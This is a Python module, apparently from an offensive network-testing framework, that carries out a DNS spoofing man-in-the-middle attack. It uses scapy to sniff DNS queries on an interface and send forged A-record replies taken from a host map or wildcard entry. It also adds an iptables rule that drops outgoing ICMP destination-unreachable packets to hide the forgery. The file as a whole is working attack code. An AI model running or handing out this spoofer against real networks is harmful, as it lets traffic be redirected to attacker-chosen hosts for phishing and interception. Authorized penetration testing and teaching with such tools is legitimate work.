import os
from scapy.layers.dns import DNS, DNSRR
from scapy.packet import Packet
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, AsyncSniffer
from scapy.all import get_if_hwaddr
from libs.aux_funcs import type_wrapper, attack_cat, attack_layer, attack_type, EXIT_SIGNAL

@type_wrapper(name = "DNS Spoofing", type=attack_type.MitM, category=attack_cat.Attack, layer = attack_layer.L4, arg_list=[])
def dns_spoof(args):
    """Performs a DNS Spoofing attack. Utilizes an imported list of records.
    Requires no additional arguments."""

    # Auxiliary function for handling dns packets
    def packet_handler(pkt: Packet):
        # Separate query in layers
        l_eth = pkt.getlayer(Ether)
        l_ip = pkt.getlayer(IP)
        l_udp = pkt.getlayer(UDP)
        l_dns = pkt.getlayer(DNS)

        # For A Records:
        if l_dns.qr == 0 and l_dns.opcode == 0:
            query_host = l_dns.qd.qname[:-1].decode()
            res_ip = None

            if host_map.get(query_host):    # If host is present
                res_ip = host_map.get(query_host)
            
            elif host_map.get("*"):         # If wildcard record is present
                res_ip = host_map.get("*")

            # If record was found, create DNS response
            if res_ip:  
                dns_ans = DNSRR( rrname = query_host + ".", ttl=330, type="A", rclass='IN', rdata=res_ip)   # DNS record

                # Full packet
                reply = Ether(dst=l_eth.src, src=get_if_hwaddr(iface))/IP(src=l_ip.dst, dst=l_ip.src)/UDP(sport=l_udp.dport, dport=l_udp.sport)/\
                    DNS(id = l_dns.id, qr=1,aa=0,rcode=0, qd=l_dns.qd, an=dns_ans)

                print("Sending DNS record to host at " + str(l_ip.src))

                sendp(reply, iface=iface, verbose=False)


    host_map = args['dns_hosts']['dns']
    iface = args['iface']

    # Disable ICMP destination-unreachable packets with iptables
    os.system("iptables-nft -A OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")

    # Configure a sniffer for DNS and callback function
    a_sniffer = AsyncSniffer(iface = iface, filter = "udp port 53", prn = packet_handler)
    a_sniffer.start()   # Start sniffer
    print("Started DNS service...")

    # Idle
    while not EXIT_SIGNAL.is_set():
        continue

    # Stop sniffer, remove iptables rule
    a_sniffer.stop()
    os.system("iptables-nft -D OUTPUT -p icmp --icmp-type destination-unreachable -j DROP")

    return args